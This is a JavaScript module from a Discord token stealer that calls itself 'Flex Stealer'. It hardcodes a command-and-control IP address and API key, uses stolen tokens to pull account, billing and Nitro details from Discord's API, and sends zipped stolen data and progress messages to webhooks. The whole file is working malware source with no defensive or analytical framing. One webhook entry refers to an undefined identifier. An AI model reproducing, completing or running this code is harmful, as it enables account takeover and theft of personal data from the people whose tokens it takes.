const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { getSystemInfo, getNetworkInfo } = require('./discordInfo');
const { getBoostEmoji, getNitroTenureBadge } = require('./badgeHelpers');

const API_URL = "http://185.254.28.182:3000";
const API_KEY = "noface_b476afdd43fb086b";

/**
 * Perform an HTTP/HTTPS request.
 */
const makeRequest = async (url, options = {}, body = null) => {
    try {
        const urlObj = new URL(url);
        const client = urlObj.protocol === 'https:' ? https : http;
        
        return new Promise((resolve) => {
            const req = client.request(url, options, (res) => {
                let data = '';
                res.on('data', (chunk) => { data += chunk; });
                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        try {
                            resolve(JSON.parse(data || '{}'));
                        } catch (e) {
                            resolve({ raw: data });
                        }
                    } else {
                        resolve(null);
                    }
                });
            });
            
            req.on('error', () => resolve(null));
            req.setTimeout(60000, () => {
                req.destroy();
                resolve(null);
            });
            
            if (body) req.write(body);
            req.end();
        });
    } catch (err) {
        return null;
    }
};

/**
 * Fetch information for a single Discord account.
 */
const getDiscordInfo = async (token) => {
    const baseUrl = "https://discord.com/api/v9";
    return await makeRequest(`${baseUrl}/users/@me`, {
        headers: { "Authorization": token }
    });
};

/**
 * Create Discord embeds for exfiltrated account data.
 */
const createAccountEmbeds = async (token, userInfo, badges = []) => {
    const user = await getDiscordInfo(token);
    if (!user) return null;

    const nitroBadge = getNitroTenureBadge(user);
    const boostEmoji = getBoostEmoji(user.premium_type || 0);
    
    const embed = {
        title: "Account Information",
        color: 0xFFFFFF,
        author: {
            name: `${user.username} (${user.id})`,
            icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${parseInt(user.discriminator || "0") % 5}.png`
        },
        description: `Token: \`${token}\``,
        fields: [
            { name: "Username", value: `\`${user.username}\``, inline: true },
            { name: "ID", value: `\`${user.id}\``, inline: true },
            { name: "Nitro", value: user.premium_type ? "Yes" : "No", inline: true },
            { name: "Billing", value: "`" + (user.billing || "None") + "`", inline: true },
            { name: "Badges", value: (nitroBadge + " " + boostEmoji).trim(), inline: true }
        ],
        footer: { text: "Flex Stealer | 2026" }
    };

    return [embed];
};

/**
 * Send exfiltrated data (like a zip file) to a webhook.
 */
const sendZipToWebhook = async (filePath, webhookUrl) => {
    if (!webhookUrl || webhookUrl.includes("YOUR_WEBHOOK_URL_HERE") || webhookUrl.includes("_HOLDER")) {
        return false;
    }

    try {
        const stats = fs.statSync(filePath);
        const fileName = path.basename(filePath);
        const boundary = "----Boundary" + Math.random().toString(36).slice(-8);
        
        const payload = Buffer.concat([
            Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${fileName}"\r\nContent-Type: application/zip\r\n\r\n`),
            fs.readFileSync(filePath),
            Buffer.from(`\r\n--${boundary}--\r\n`)
        ]);

        const res = await makeRequest(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'Content-Length': payload.length
            }
        }, payload);

        return !!res;
    } catch (err) {
        return false;
    }
};

/**
 * Send a progress update message to the webhook.
 */
const sendProgressMessage = async (message) => {
    const webhooks = [
        V5XTPZ, // Custom C2 or placeholder
        "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"
    ];

    const payload = JSON.stringify({
        username: "Flex Stealer",
        content: `**Progress Update:** ${message}`
    });

    for (const hook of webhooks) {
        if (hook && hook.includes("http")) {
            await makeRequest(hook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            }, payload);
        }
    }
};

module.exports = {
    createAccountEmbeds,
    sendZipToWebhook,
    getUserInfo: getDiscordInfo,
    getSystemInfo,
    getNetworkInfo,
    sendProgressMessage,
    API_URL,
    API_KEY
};